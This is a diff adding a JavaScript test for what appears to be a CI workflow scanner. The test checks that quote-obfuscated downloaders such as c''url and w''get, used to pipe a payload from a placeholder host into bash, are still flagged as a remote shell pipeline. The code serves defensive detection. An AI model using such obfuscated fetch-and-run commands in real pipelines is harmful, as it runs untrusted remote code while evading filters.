@@ -1047,3 +1047,12 @@ test('Codex P1: escaped curl and wget downloader still trigger remote pipeline h
   assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE')||result.status==='INCOMPLETE',JSON.stringify({downloader,result}));
  }
 });
+
+test('Codex P1: quote-concatenated downloader command is still risky',()=>{
+ for(const downloader of ["c''url",'"c"url',"c'u'rl","w''get",'"w"get']){
+  const src=['on: push','jobs:','  audit:','    steps:',
+   '      - run: '+downloader+' https://example.invalid/payload | bash'].join('\n');
+  const result=scan(src);
+  assert.ok(rules(result).includes('REMOTE_SHELL_PIPELINE')||result.status==='INCOMPLETE',JSON.stringify({downloader,result}));
+ }
+});
